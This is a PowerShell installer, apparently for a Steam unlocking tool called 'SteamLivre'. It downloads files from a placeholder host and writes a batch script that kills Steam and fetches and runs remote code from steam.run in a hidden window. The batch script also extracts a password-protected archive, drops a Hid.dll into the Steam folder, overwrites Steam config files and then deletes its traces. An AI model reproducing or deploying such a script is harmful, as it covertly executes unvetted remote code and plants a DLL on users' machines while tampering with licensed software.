$ErrorActionPreference = "Stop"

# Cria pasta temporaria invisivel
$tempDir = "$env:TEMP\SteamLivreSetup"
if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir }
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

Write-Host "=================================================" -ForegroundColor Cyan
Write-Host "       INICIANDO INSTALADOR STEAMLIVRE" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan
Write-Host "Baixando arquivos necessarios da nuvem. Aguarde..." -ForegroundColor Yellow

# =========================================================
# MUDE O LINK ABAIXO PARA O SEU SITE REAL DO VERCEL
# =========================================================
$baseUrl = "https://SEU_SITE.vercel.app"

$urlZip = "$baseUrl/STEAMLIVRE.zip"
$url7zExe = "$baseUrl/7z.exe"
$url7zDll = "$baseUrl/7z.dll"

try {
    Invoke-WebRequest -Uri $urlZip -OutFile "$tempDir\STEAMLIVRE.zip" -UseBasicParsing
    Invoke-WebRequest -Uri $url7zExe -OutFile "$tempDir\7z.exe" -UseBasicParsing
    Invoke-WebRequest -Uri $url7zDll -OutFile "$tempDir\7z.dll" -UseBasicParsing
} catch {
    Write-Host "Erro ao baixar os arquivos da internet. Verifique sua conexao ou os links." -ForegroundColor Red
    Start-Sleep -Seconds 5
    Exit
}

# Cria o .BAT do instalador
$batCode = @'
@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title instagram @steamlivre
mode con: cols=100 lines=38

cd /d "%~dp0"

set "ARQUIVO_ZIP=STEAMLIVRE.zip"
set "EXTRATOR=7z.exe"
set "SENHA_ZIP=40028922"
set "URL_AGRADECIMENTO=https://agradecimentopmw.lovable.app"

call :Header
echo.
echo  [INFO] Buscando diretorio da Steam...

for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do set "steamExe=%%A %%B"
for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"
set "configDir=%steamDir%\config"

call :Header
echo.
echo  [+] Preparando instalacao...
echo.
echo  [#####               ] 25%%
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 2 /nobreak >nul

call :Header
echo.
echo  [+] Configurando ambiente...
echo.
echo  [##########          ] 50%%
powershell -WindowStyle Hidden -Command "iex (irm https://steam.run) *>$null"
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 2 /nobreak >nul

call :Header
echo.
echo  [+] Extraindo arquivos...
echo.
echo  [###############     ] 75%%
if exist "%temp%\sl_temp" rmdir /s /q "%temp%\sl_temp"
mkdir "%temp%\sl_temp"
"%EXTRATOR%" x "%ARQUIVO_ZIP%" -p%SENHA_ZIP% -y -o"%temp%\sl_temp" -bso0 -bsp0 >nul
timeout /t 2 /nobreak >nul

call :Header
echo.
echo  [+] Aplicando configuracoes...
echo.
echo  [##################  ] 90%%
xcopy /e /i /y "%temp%\sl_temp\Config\*" "%configDir%\" >nul 2>&1
copy /y "%temp%\sl_temp\Hid.dll" "%steamDir%\" >nul 2>&1
rmdir /s /q "%temp%\sl_temp" >nul
start "" "%steamExe%"
timeout /t 2 /nobreak >nul

call :Header
echo.
echo  [+] Instalacao Concluida!
echo.
echo  [####################] 100%%
timeout /t 2 /nobreak >nul
start "" "%URL_AGRADECIMENTO%"

call :Header
color 0A
echo.
echo ========================================================
echo         INSTALACAO STEAMLIVRE FINALIZADA!
echo ========================================================
echo.
echo  Muito obrigado por utilizar nossos servicos.
echo.
echo  Pressione qualquer tecla para fechar o instalador...
pause >nul
exit /b

:Header
cls
color 0B
echo.
echo.
echo     _^|_^|_^|  _^|_^|_^|_^|_^|  _^|_^|_^|_^|    _^|_^|    _^|      _^|  
echo   _^|            _^|      _^|        _^|    _^|  _^|_^|  _^|_^|  
echo     _^|_^|        _^|      _^|_^|_^|    _^|_^|_^|_^|  _^|  _^|  _^|  
echo         _^|      _^|      _^|        _^|    _^|  _^|      _^|  
echo   _^|_^|_^|        _^|      _^|_^|_^|_^|  _^|    _^|  _^|      _^|  
echo.
echo    S  T  E  A  M    L  I  V  R  E
echo   ==================================================
echo         ^>^>^> nos siga no instagram @steamlivre ^<^<^<
echo.
exit /b
'@

Set-Content -Path "$tempDir\instalador.bat" -Value $batCode -Encoding UTF8

# Executa o BAT e limpa a sujeira depois
Write-Host "Abrindo tela de instalacao..." -ForegroundColor Green
Start-Process -FilePath "$tempDir\instalador.bat" -Wait
Remove-Item -Recurse -Force $tempDir